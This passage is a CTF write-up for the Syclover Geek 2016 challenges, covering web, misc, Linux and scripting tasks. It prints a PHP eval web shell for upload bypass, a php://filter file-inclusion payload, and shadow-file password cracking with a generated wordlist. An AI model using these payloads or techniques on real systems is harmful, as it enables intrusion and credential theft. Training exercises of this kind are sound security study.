XNRDEQUTLGVDVEVCOIRLDA5CXKMYVERCWGFHEUUZQOBLVMMKGKNKTAOKPKVVXQSCRGFNEYVTLNBDVC3C2IZKFKTLZKNLHATKSGFWFKVJRNRGFIVTMK5LFMUSEKYYGYV2TIVNEYVTLOBJFIMKKJBJFIUSXKZCVMS2RNNYFOVCWJZKFMVLULJLVKZCKKVVEUVSUNM2U6USWNRLVMRLYJNLWWUSXKIYUUTCNNNWE6VCFMRME2MCOLFJTANBRKJLFMVCNNRUE6VDKJJDFIMKVPJGWW6CLKEYFURSUKVJFMU3MOBGVM2ZRK5KTCZCMKZVFMRSWKZSEIVSFMRDVI23EIRLGYTSHKNWHATKSNNRXUUJQORFVK23QLBLDC4CEKNCXIT2UIVNFMVTLORLFGMK2K5LEKTSWK5WEMTKTNNUEOVCVGFGFIMDMMFJWYUSEKVWE26KTGBYEIV2FNRLVKMBVJ5KWW4CGKZLFUVKUIVSFOUSGLJCFM3CNPFJTCSSNKJCUMUCTGBJEYVDMMRDVMVSOKRLGWNKPJVVWIRCWKZFFEU3LOBEFM22WJZKEKVSMJZKXIVKRPJFEIVCVORFVM222JZKWYTSYKMYXAS2SKVWFOTLLLJEFM23IKZHEMSSMJVVXIS2UIVSFMVJRJZNFGMBVK5LUKRSVKEYU4T2UNRNFSVJRKJFVK23UMFJGYVJQKZVXQWSTNNFE2VTLGAYFCMCWJRKFM3CJKNLFS6KWGA2U6VCFLJHFM3CSJZJWY4CMKZVVMTSRPJFEWVTLOBEFOVS2KRLUK5CWK5LGISSWIRFFOVDLGQYFE2ZZKZKEISSLK5VU4R2SKUYUKVSVNRHVG3C2JZLWWTS2KNWHAV2WKRJFQUZRKJEFC3DIKVITCVSUKZKXIS2TNRNEIVCVON4VG22KJJLDC3DBKEYGITCXKZWFOVCWKV4VM2ZVJ5GWWVSYKZKXQTKUIVYESUTLON4U2MLMJVJWW5CHKMYWIVCUIV2GCUJRKZHFMRSOKVKUK4CHKJLGYV2NNRSE6VLLGFDVIMK2KVJFK3CTKRCWIWCXNNHESUZQGVCFM2ZRKZKTCZCMKZVFERSOIZNEIVRQOBFVCMK2JZGWUTSGKNWHAS2XIZLFIVJQPBGFK3C2LFJVMZCEKYYUES2UIVLEUVTLJZDVIMKKI5LGWZCOKN5EUTCXNN2FQV2WKJKFKRLUKNLGY2CCKVWE4WKTKZYESUTLGFKVIRJRJZKWW3CHKF5ES6SSKVVTCUZQLJFFKMKSINJTCWSXK5CWITSTGFJEQUTLOBDFGVS2KNKWW4DBKNCVUSCUKVZXSU32KZGVE23MKZKTC2CMKRLGYV2WKZHEIVJQGVHVGRK2KRLGW4CTKRCXAR2WNN2FOU3MLJGFI23UIZKFMZCUKMYHAV2WNNLFITTLORKVGMK2LJJFISSWKVWEUT2VNN4EOUZQGFBVO23QKNJTAZC2K5VU4SKTGFLFUUSFJZJVCMLEJBIVISSWJZWFUTKUKU2UGVCFLJHFM23YLFKUKWSLKYYWGMCRGBUEYV3MLJMVE6S2JRKGWZCHKJCVMVSWIZHFOVBQJJHFM2ZRK5KTCZCMKZVWYWCWPJLEIV2FORHFOVTEKJKTCTSXKVCXAR2SNNSFMVLMIZGVG23EK5JFISTBKVVXGMKTGFJEEVRRJZGVG6SWK5LUMRSXJVWFETCVNNNEQUJRLJKFM2ZRKNIWYWSIJVVES6KTNRFEYUSFIUYVCMLQJRKFM3CXKRLGIVCWGBSEGVRQLJGFMVLQKNJTA4CJKZVWW6KNGBWEUV3LORCVCMLEKRJFK5DBKZWGISSVNJFFGVDMJJHVEVCSKVKEK5CLK5VXQR2SPJFFIVRQOBHVIRKSIRGTATSZKMYVMWSSIVHFKUJRNBGFO3DEI5KFMUSUKIYHAS2RGBNE4VLLPBDFGVCWJVLGW5CXKV5EUTCXNN4EMTSGLJKFMRLEINLVKVS2KZWFETKUGFFESUTLMRHFGMBZJNKGW2CHKN5FMRCTKVZTCUZQKUYFK22OKRJDASLZKJVTSV2RGBNE2U3LNBDVIVCJPJLFK5DBKNWFUTSWGFHFMUZQOBGFMRSOK5KTANKIKFLGYVSNNRKXUVCFORQVERS2JBLGYTLZKNWEUTCSGFWFEVJQNBGFI3DEJBJVMZCEKZVWIR2TIVKXSVSWOBJFI3CKJ5JGWMKOKJCVESCTNN2FKUJRJZKFGVLUJNLGYUSMKVWE4WKTGFYE2UTLNRLVK3CGJBLGW4CXKNLEUVCNNNWGCVCFMRNFMRLYMFJTANKNKJLFMVKTGFHE6VDMOBKVCMKWJNKWWNKDKIYFKMCWNN4FMVCFJJFVM2ZRKRKTAVSMK5LGYSKTKZWEYV2FORLVI22WKJLGYUSNKMYHASCWNNRXSTJRIZFFM23YJBLDCWSNK5VXGMKWGBLE4VSVORKFI2ZUPFJGW5CWKMYVMTCXNNHEOU2WLJGVMVLTGFKEKZC2JVVU4RCTGFYFOV2FNRLE23C2JJLGY3CGKYYVMVCWNM2VGVCGLJEFIVKNPFJTASSMKYYWIWCVGFUEYU2WNRCVCMKSJRKTA5CXJZCVMWCWNNHEOVCWJJGVE23UJZJTAOKNKJVXAVKRGFHFIV2VORFVIRK2JZLFISSVKIYFUSKSKRNFOUSFPBGFG22SK5JVKMKMJVVWYU2TNNSFUVKWJZCVGMBVJVJGYVSTKEYDKT2TNNUEOVSWKV5E223UMFJGYWSGJVVE4VSTNRYEWVSFIZHFGMBRJRKWW6CIK5LE4TCVNN2GCUZRNBKFM23QKJKFMSSFKZVXITSRPJFEYU3LPBDFIVSSKRJUK5COK5KWQQSVKRFFQVDLGVKFEVCSKZLWYRSQKVVVUR2TPJEXUV2VOBBVIRS2JZLDCTSWKMYXAV2XIVWFOVJRNBGFO2ZVI5KFMWSLKVKXAYKTGBNEUTLMOBLVGMLQJNJGW5CQKMYWIS2WNRSEQU2WKJCFORJVKNJEKWSQKZLHAU2UIVYEQVTLKZLVIRSSJBJGW4CYKYYVMVCSKV2FUV2WKUYFKMCOKVKGYSSPKJWEMVSNNNNEUV3LPBDE22SOIRLDA4CLKRCWIWCWGFHEQU32KZGVE3CWK5ITCTSPKRWGYSCRGFLGCVLLPBFVEMC2JJLGW6CWKNLEUS2WGFWFIVJQGFGFOVTMLBJDAMKUKVVWIQ2WGBLFUVSGJZLVKRKKIVJFIUSTKUYU4SSVNN4EKUKVGVGFKRLUKZLVKWSOKZKU4WCTGFFESUSUJJLFO3CKJVJFM3CHKRKEUYKVKZBEOURRMRMFIMDUJRJWY4CMK5CUMU2TGFFEYV3MJZDVGVS2IRJGWOKTKVLFUTSNGBGXSU3MOBGVEVJRKVKTCUSMKZVU4WKRKZEXSVJQORQVMMC2JZLGWTSHKVCUUSKSNNZXSV3MJJFE4VLUI5KFMZCUKZKXIVSXKVUEUVSUJJKVEMC2JNJFKVSVKUYVUS2XNN2FOURQGFCFMMDYJNKEKZCYKRKXIWKTGFLFUVRQNRKFKMLEJ5JWWWSGKQYVK6KWGB4EWUJRLJFFK23YIZJVIVSMKIYWIWCVGA4UWVSWNRDE4RSOIRLEMQSLKRCVMWCWNRFFGVDMJJGFE23UJZIWYSSLKVVWQR2UKZSFIV2VORHVIRKWKRHGW5CYKNLFS6KSNNSFMTLLLJGFO222I5KFMSSNK5KXAV2TGFLEYVJRJZDVGMLQK5LDAYZSKUYUUUKTNNNEMVRRLF5FIRJRKNJTCWSEKZWE4VCTGFFEYUSFIUYVCMBZJRHFK6CIKVLEMVCWNM2U6U2FLJJFMVSKKJJWW4COKJVVK6KNNRSEYVTLORDFGMBRJRKFK5CPKZWGIUSWNJFFKUZRJJDFORSWK5GWYWSPKVWEMV2SGAYUITLLOBQVIRKSIRLEMTSZKMYDCWSWKZLFGUJRNBFFM22SI5JVMUSNKRKXIS2TIZNEUTLMOBLVGVTQJVJGWMKYKUYFMTCXNRNFKVJRKV4VKMDEINKGWVSSKZCXQTSUGBFE2VTLMN4VO3C2JNKGW4CGKMYVEVKRNN2EWUJRKZLFMRKOKRJTC4CYKJKXIV2TNRFEYU3LJZDVIVS2JVLFKMKHKRCVEQSWNRHFIUZROBGFEVSWLBITCUSIKFWGYRSVKZLFKVCFMRDVG3C2JBGTATLZKNVTKSKSNNZTEUJRNBGFIVTMK5LFMWSEKZKWIQ2NNNSEIVTMKJHFGMKWLJJGWMKOKEYDSTCWNNYEKUKWJZKE223UJNKEKZC2KZWE4WCTKZMTAUSWIZLFMRLYJ5IWWUSXKJLFUVCTGB2FGVCFKJBE4RKOJVJTCSSFKIYGYWCRGA4U6VDLNBDVKMKWMFKWW4CLKIYVURSNGBHFQU32KZFFMRKOMFITA3CMKJWFURSWKZEXSVSVORQVIVTIKRLGYUSNKIYVUQ2WNNKXSTLKJJFVO23UI5JTCUSUKVKXITSXKZNFMVL2JJKFGVS2IVJGYRSXKNWEMT2RNNSEOUT2JF5FMVLLGFKEKWSOKYYU4VSTGFWFUURRNRLU22ZZJJLGW6CHKZLFUVKTGBYGCURRLJGFK23UJRJVMWSNKIYWIVKVGA4UYUTMMRDFMVSNPFLGWNKPJZCVMTCWKV2FMUZQOBCFE22WKNKEMVSLJZKXIRSTGFSFIVRQORLFOVSVGBLDATSVKIYFUWSSKZHFMVSFGFFVO23YI5KHUTSEKIYHAV2TNRSFQV3LJZMVGMDQJRJFMVS2KMYVUT2UNJFEOURRKZJVK2ZRKNKFKWSKKRKVEVSTNRYEWVSFJUYFCMLMJRJWYWSVKEYVK6KUNM2VGVCFKZNFM2SOJVKUKSSFKJVWIV2VPJFEYVLLPBEFMMBRJRLEK5CHKZWFUTCUKVHFOVDMJJEFORSOKZGWYWSQKFVWIV2SKUYU2USVORJVGMKSIRLEMTSOKMYUUV2WKRJFOTLMKJEFCVCSKZLVMWSMKZVTSU2TNNNFAVTLORKFGMKKJVJGW5CVKUYWITCTKZWEMUZQGFKFM23UKJLVKUSUKZKU4VSSGBCTEVKUGA4VAVBQHU======</div></pre></td></tr></table></figure></p>
+<p>看到等号，首先想到base64，但是发现都是大写，没有小写，考虑到是base32解出来发现是base64,再解发现是base32这样交替循环着<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line">word = &apos;&apos;</div><div class="line">for dd in range(0,10):</div><div class="line">    word2 = base64.b32decode(word1)</div><div class="line">    word1 = base64.b64decode(word2)</div><div class="line">print(word1)</div></pre></td></tr></table></figure></p>
+<p>flag;SYC{I_Love_You}</p>
+<h3 id="狗师傅的计算器-score-200"><a href="#狗师傅的计算器-score-200" class="headerlink" title="狗师傅的计算器(score:200)"></a>狗师傅的计算器(score:200)</h3><p>狗师傅说fuck my brain:)。<a href="http://game.sycsec.com:50085/" target="_blank" rel="external">http://game.sycsec.com:50085/</a></p>
+<p>解法：文件包含….打开页面，发现是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+++++ +++++ [ - &gt; ++ +++++ +++ &lt;]&gt; ++++ +++++ +++++ +++++ &lt;+++。 + [ - &gt; - - &lt;]&gt; - + +++++ + --- ----- - &lt;++ + [ - &gt; + ++ &lt;]&gt; +++ .- -.--- ----- &lt;+++ ++++ [ - &gt; --- ---- &lt;]&gt; --- &lt;+++++ +++ [ - &gt; ++++ ++++ &lt;]&gt; ++。----- --- + +++++ ++ &lt;</div></pre></td></tr></table></figure></p>
+<p>在看到robots.txt后，发现是brain fuck，下载个brainfuck.exe进行转码(将代码复制下来保存在brainfuck.exe同目录下，并命名为test.b)，结果是welcome.php。当然，也可以用Python来解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line">import sys</div><div class="line"> </div><div class="line">def mainloop(program, bracket_map):</div><div class="line">    pc = 0</div><div class="line">    tape = Tape()</div><div class="line">    while pc &lt; len(program):</div><div class="line">        code = program[pc]</div><div class="line">        if code == &quot;&gt;&quot;:</div><div class="line">            tape.advance()</div><div class="line">        elif code == &quot;&lt;&quot;:</div><div class="line">            tape.devance()</div><div class="line">        elif code == &quot;+&quot;:</div><div class="line">            tape.inc()</div><div class="line">        elif code == &quot;-&quot;:</div><div class="line">            tape.dec()</div><div class="line">        elif code == &quot;.&quot;:</div><div class="line">            # print</div><div class="line">            os.write(1, chr(tape.get()))</div><div class="line">        elif code == &quot;,&quot;:</div><div class="line">            # read from stdin</div><div class="line">            tape.set(ord(os.read(0, 1)[0]))</div><div class="line">        elif code == &quot;[&quot; and tape.get() == 0:</div><div class="line">            # Skip forward to the matching ]</div><div class="line">            pc = bracket_map[pc]</div><div class="line">        elif code == &quot;]&quot; and tape.get() != 0:</div><div class="line">            # Skip back to the matching [</div><div class="line">            pc = bracket_map[pc]</div><div class="line">        pc += 1</div><div class="line"> </div><div class="line">class Tape(object):</div><div class="line">    def __init__(self):</div><div class="line">        self.thetape = [0]</div><div class="line">        self.position = 0</div><div class="line">    def get(self):</div><div class="line">        return self.thetape[self.position]</div><div class="line">    def set(self, val):</div><div class="line">        self.thetape[self.position] = val</div><div class="line">    def inc(self):</div><div class="line">        self.thetape[self.position] += 1</div><div class="line">    def dec(self):</div><div class="line">        self.thetape[self.position] -= 1</div><div class="line">    def advance(self):</div><div class="line">        self.position += 1</div><div class="line">        if len(self.thetape) &lt;= self.position:</div><div class="line">            self.thetape.append(0)</div><div class="line">    def devance(self):</div><div class="line">        self.position -= 1</div><div class="line"> </div><div class="line">def parse(program):</div><div class="line">    parsed = []</div><div class="line">    bracket_map = &#123;&#125;</div><div class="line">    leftstack = []</div><div class="line">    pc = 0</div><div class="line">    for char in program:</div><div class="line">        if char in (&apos;[&apos;, &apos;]&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;+&apos;, &apos;-&apos;, &apos;,&apos;, &apos;.&apos;):</div><div class="line">            parsed.append(char)</div><div class="line">            if char == &apos;[&apos;:</div><div class="line">                leftstack.append(pc)</div><div class="line">            elif char == &apos;]&apos;:</div><div class="line">                left = leftstack.pop()</div><div class="line">                right = pc</div><div class="line">                bracket_map[left] = right</div><div class="line">                bracket_map[right] = left</div><div class="line">            pc += 1</div><div class="line">    </div><div class="line">    return &quot;&quot;.join(parsed), bracket_map</div><div class="line"> </div><div class="line">def run(fp):</div><div class="line">    program_contents = &quot;&quot;</div><div class="line">    while True:</div><div class="line">        read = os.read(fp, 4096)</div><div class="line">        if len(read) == 0:</div><div class="line">            break</div><div class="line">        program_contents += read</div><div class="line">    os.close(fp)</div><div class="line">    program, bm = parse(program_contents)</div><div class="line">    mainloop(program, bm)</div><div class="line">    </div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">run(os.open(sys.argv[1], os.O_RDONLY, 0777))</div></pre></td></tr></table></figure></p>
+<p>执行python brainfuck.py xxx.bf</p>
+<p>在看robots.txt的时候发现有个包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$str=$_GET[&apos;syc&apos;]; //包含参数</div><div class="line"> </div><div class="line">if(strpos($str ,&apos;..&apos;) &gt; -1 || strops($str , &apos;=/&apos;) &gt; -1)&#123;  //过滤参数</div><div class="line">    die(&apos;Do not hack master go :)&apos;);</div></pre></td></tr></table></figure></p>
+<p>觉得这道题是文件包含。看了robots.txt知道，在result.php里面有一个get请求，请求头是syc，有戏。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload:http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc</div></pre></td></tr></table></figure></p>
+<p>包含的其实是syc.php，只不过在末尾会默认添加php，所以写个syc就可以了。<br>得到一串base加密密文，拿去解密即可；<br>flag：SYC{php_iS_Fun}</p>
+<h3 id="Only-number-never-lies-to-you-score-250"><a href="#Only-number-never-lies-to-you-score-250" class="headerlink" title="Only number never lies to you(score:250)"></a>Only number never lies to you(score:250)</h3><p><a href="http://game.sycsec.com:50082/" target="_blank" rel="external">http://game.sycsec.com:50082/</a> Only number never lies to you. Tip:dir</p>
+<p>解法：进入界面之后Only number never lies to you 151029103521**，仔细看那一串数据，发现将5改为6,就是我现在访问的时间（只有数字不会说谎），题目提示dir—–&gt;列目录。那目录名应该就是由数字组成的。所以应该是—-&gt;访问时间+两位数字</p>
+<h3 id="上传-1-score-100"><a href="#上传-1-score-100" class="headerlink" title="上传(1)(score:100)"></a>上传(1)(score:100)</h3><p><a href="http://game.sycsec.com:50081/" target="_blank" rel="external">http://game.sycsec.com:50081/</a></p>
+<p>解法：试了几个上传的后缀名，上传phtml成功出flag。<br>flag：SYC{Ohno_y0u_f0und_me}</p>
+<h3 id="上传-2-score-100"><a href="#上传-2-score-100" class="headerlink" title="上传(2)(score:100)"></a>上传(2)(score:100)</h3><p><a href="http://game.sycsec.com:50081/接上一个题目，还有ｆｌａｇ哦!" target="_blank" rel="external">http://game.sycsec.com:50081/接上一个题目，还有ｆｌａｇ哦!</a></p>
+<p>解法：上一道题上成功后，得到上传的地址。因为是上传了一句话，所以就直接用菜刀直接连，但是连接过去提示了所上传phtml中的内容，可能大概的过滤掉了某些参数。尝试了几个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;Php&quot;&gt;eval ($_POST[1]);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>连接即可。<br>flag:SYC{bRa1Nf4Ck}</p>
+<p>思考：上传2的shell和php_is_fun的shell所在的服务器是一样的，但是为什么会有不一样的权限。<br>为什么同一台服务器的shell权限不一样，然后就去问了客服小哥。小哥说只有一台服务器，但是题目是用docker搭建的。</p>
+<h3 id="你是人间四月天-score-150"><a href="#你是人间四月天-score-150" class="headerlink" title="你是人间四月天(score:150)"></a>你是人间四月天(score:150)</h3><p>岁月不堪数 故人不知处 最是人间留不住 <a href="http://game.sycsec.com:50080/9392d16bb9fbda00/" target="_blank" rel="external">http://game.sycsec.com:50080/9392d16bb9fbda00/</a></p>
+<p>解法：打开页面。发现两个选项都是no。<br>qq%e6%88%aa%e5%9b%be20161025004524<br>改成yes出现<br>想到的是伪造，然后尝试了<br>Referer：来源伪造—&gt;失败<br>X-Forwarded-For：ip伪造—&gt;失败<br>Host：指定访问的http服务器的域名/IP 地址和端口号—&gt;成功</p>
+<p>出现flag：SYC{Where_can_i_find_yuo_girl}</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题-score-10"><a href="#签到题-score-10" class="headerlink" title="签到题(score:10)"></a>签到题(score:10)</h3><p>SYC{We1c0m3_To_G33k_2O!6}</p>
+<h3 id="xiao彩蛋-√已完成"><a href="#xiao彩蛋-√已完成" class="headerlink" title="xiao彩蛋(√已完成)"></a>xiao彩蛋(√已完成)</h3><p>听说关注微博关注后私信有彩蛋</p>
+<p>解法：刚开始我是关注了：微博关注，果然是想太多，然后关注三叶草小组的微博之后私信发送flag就可以得到</p>
+<h3 id="闪的好快-score-150"><a href="#闪的好快-score-150" class="headerlink" title="闪的好快(score:150)"></a>闪的好快(score:150)</h3><p><a href="http://down.sycsec.com/misc/masterGO.7z" target="_blank" rel="external">http://down.sycsec.com/misc/masterGO.7z</a> 这是二维码吗？嗯。。。是二维码了，我靠，闪的好快。。。</p>
+<p>解法：是一个gif动态二维码图，用GIF Movie Gear将图片打开，以此扫描即可<br>flag：SYC{F1aSh_so_f4sT}</p>
+<h3 id="Come-game-score-50"><a href="#Come-game-score-50" class="headerlink" title="Come_game(score:50)"></a>Come_game(score:50)</h3><p>听说游戏通关就有flag <a href="https://pan.baidu.com/s/1dE1zzWH" target="_blank" rel="external">https://pan.baidu.com/s/1dE1zzWH</a></p>
+<p>解法：.小基友硬玩过关得到flag,另一种解法：打开游戏，在目录下会生成一个save的文件。用Winhex01 32改成01 35，原理就是：第一关是32，过一关就+1,一共3关，所以改成35后重新进入游戏就可以通关了。<br>flag：SYC{6E23F259D98DF153}</p>
+<p>###snow(score:50)<br>NO KEY NO FLAG <a href="http://down.sycsec.com/misc/snow.html" target="_blank" rel="external">http://down.sycsec.com/misc/snow.html</a></p>
+<p>解法：源代码中key:syclover2016，抓包看看。<br>但是发现一个奇怪的地方，就是用Firefox+burpsuite抓不到包，而用chrome+burpsuite是可以的。这时候看了官方给的提示，知道是隐写题，使用snow加密的<br>解密命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">snow -C -p &quot;key&quot; outfile</div><div class="line">----------&gt;SYC&#123;HaHaHa_You_Find_Me&#125;</div></pre></td></tr></table></figure></p>
+<p>这里最坑的就是，用转存的页面是解不出来的，要查看源代码，复制出来的页面才能解。</p>
+<h3 id="旋转跳跃-score-100"><a href="#旋转跳跃-score-100" class="headerlink" title="旋转跳跃(score:100)"></a>旋转跳跃(score:100)</h3><p>熟悉的声音中貌似又隐藏着啥，key：syclovergeek 链接: <a href="https://pan.baidu.com/s/1hsdncKs" target="_blank" rel="external">https://pan.baidu.com/s/1hsdncKs</a> 密码: xu5b</p>
+<p>解法：MP3的隐写题，看到是有key的。想到了MP3Stego。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">MP3StegoDecode.exe -X -P syclovergeek sycgeek-mp3.mp3</div><div class="line">解开的txt里有flag</div><div class="line">SYC&#123;Mp3_B15b1uBiu_W0W&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="凯撒部长的奖励-√已完成"><a href="#凯撒部长的奖励-√已完成" class="headerlink" title="凯撒部长的奖励(√已完成)"></a>凯撒部长的奖励(√已完成)</h3><p>就在8月，超师傅出色地完成了上级的特遣任务，凯撒部长准备给超师傅一份特殊的奖励，兴高采烈的超师傅却只收到一长串莫名的密文，超师傅看到英语字串便满脸黑线，帮他拿到这份价值不菲的奖励吧。 密文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MSW&#123;byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om&#125;</div></pre></td></tr></table></figure></p>
+<p>解法：丢去凯撒解密就可以了</p>
+<h3 id="MD5cracker-score-50"><a href="#MD5cracker-score-50" class="headerlink" title="MD5cracker(score:50)"></a>MD5cracker(score:50)</h3><p>01540f319ff0cf88928c83de23l27fbb 狗师傅说flag是解出MD5后加上SYC{}哦！</p>
+<p>解法：因为仔细一看，发现了l，就改成了1，就直接解出来了<br>flag：SYC{clay}</p>
+<h3 id="PEN-AND-APPLE（分数：150）-√已完成"><a href="#PEN-AND-APPLE（分数：150）-√已完成" class="headerlink" title="PEN_AND_APPLE（分数：150）(√已完成)"></a>PEN_AND_APPLE（分数：150）(√已完成)</h3><p>狗师傅平日里比较害羞，但是又想追女神，于是他隐藏了一段信息在这段自拍中，这句话是他最想对女神说的话:) 你能找到信息，并帮助狗师傅表白成功么:) 视屏在这儿:)<a href="https://pan.baidu.com/s/1slu5Vwp" target="_blank" rel="external">https://pan.baidu.com/s/1slu5Vwp</a></p>
+<p>解法：下载下来发现是ppap，最近很火的。这道题还是等到了官方给出提示之后才做的。提示：该题目与Windows下的type命令有关 , 而且文件为rar格式压缩也印证了这一点 , 因此想到可能是NTFS流文件 , 直接使用工具(NTFS Stream Info)进行提取 , 注意在解压压缩包的时候要使用winrar , 因为只有winrar才支持保留ntfs流文件 , 解压后使用工具进行扫描提取 , 得到一张图片 , 图片中的内容即为flag</p>
+<h3 id="藏着小秘密的流量包（分数：200）"><a href="#藏着小秘密的流量包（分数：200）" class="headerlink" title="藏着小秘密的流量包（分数：200）"></a>藏着小秘密的流量包（分数：200）</h3><p><a href="http://pan.baidu.com/s/1cwwdVC有一天皓宝宝没了流量只好手机来共享，顺便又从手机发了点小秘密到电脑，你能找到它吗？" target="_blank" rel="external">http://pan.baidu.com/s/1cwwdVC有一天皓宝宝没了流量只好手机来共享，顺便又从手机发了点小秘密到电脑，你能找到它吗？</a></p>
+<p>解法：因为文件太大，所以怀疑。参照<a href="http://blog.sina.com.cn/s/blog_ab9229c10102wp0n.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_ab9229c10102wp0n.html</a><br>flag:SYC{this_is_bluetooth</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>1、linux_1(score:150)<br>这是一个docker镜像文件，答案就隐藏在深处的一个文件中，你能找到它吗？链接: <a href="https://pan.baidu.com/s/1hsjYDqk" target="_blank" rel="external">https://pan.baidu.com/s/1hsjYDqk</a> 密码: a1ux<br>2、linux-2(score:150)<br>接着找呀，还有一个flag文件<br>3、继续继续,听说有一个用户的密码是syc和一个生日组合的(年月日格式)，请帮忙找回它，最后flag为：SYC{用户密码}</p>
+<p>解法：由于这三道都是同个docker镜像文件，所以统一写，如果没接触过docker<br>就去这里看看它的基本命令。<br>首先将tar文件拷贝到另外的一个docker daemon上，就可以直接通过docker load来加载镜像，之后直接 sudo docker load -i geek_linux.tar这样就可以将geek_linux.tar文件中所包含的镜像导入，加载成image的形式，之后再docker image -a就可以发现.然后就每个文件都看一下。<br>1.发现在/usr/local/etc/发现了geek文件夹，ls无果，有可能是隐藏的文件，用find -name “.*”，发现有个.flag打开就有flag。<br>2.在翻目录的时候在/root/下发现了F1Ag2.swp，这个是vim异常退出而产生的文件，vim -r F1Ag2.swp恢复，然后打开得到flag。<br>3.因为是用户密码，而用户密码凭据在shadow文件中，所以我们将shadow文件复制下来，用john进行破解，在弄的时候，手上的Ubuntu抽风了。<br>生成字典：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: &lt;utf-8&gt; -*-</div><div class="line">for year in range(1970,2016) :  </div><div class="line">    for month in range(13) :  </div><div class="line">        if month &lt; 10 :  </div><div class="line">            month_str = &quot;0&quot; + str(month)  </div><div class="line">        else :  </div><div class="line">            month_str = str(month)  </div><div class="line">        for day in range(32):  </div><div class="line">            if day &lt; 10 :  </div><div class="line">                day_str = &quot;0&quot; + str(day)  </div><div class="line">            else :  </div><div class="line">                day_str = str(day)  </div><div class="line">            password = &quot;SYC&quot; + str(year) + month_str + day_str  </div><div class="line">            print password</div></pre></td></tr></table></figure></p>
+<p>由于开始我没有考虑单数的问题，所以。。。。参考了一航同学的才想起来<br>flag1：SYC{L1Nux_1s_Fun_F0r_uS}<br>flag2：SYC{40ac6ed53f18a051}<br>flag3：SYC{syc19770308}</p>
+<h2 id="Program"><a href="#Program" class="headerlink" title="Program"></a>Program</h2><h3 id="compress300-score-250"><a href="#compress300-score-250" class="headerlink" title="compress300(score:250)"></a>compress300(score:250)</h3><p>是master go就解压300层 <a href="http://down.sycsec.com/programme/300" target="_blank" rel="external">http://down.sycsec.com/programme/300</a></p>
+<p>解法：利用Python中的tarfile,zipfile<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import zipfile</div><div class="line">import tarfile</div><div class="line">for i in range(1, 301)[::-1]:</div><div class="line">    path = &quot;/root/rcoil/&quot; + str(i)</div><div class="line">    try:</div><div class="line">        tar = tarfile.open(path)</div><div class="line">        tar.extractall(&quot;/root/rcoil/&quot;)</div><div class="line">    except:</div><div class="line">        pass</div><div class="line">    try:</div><div 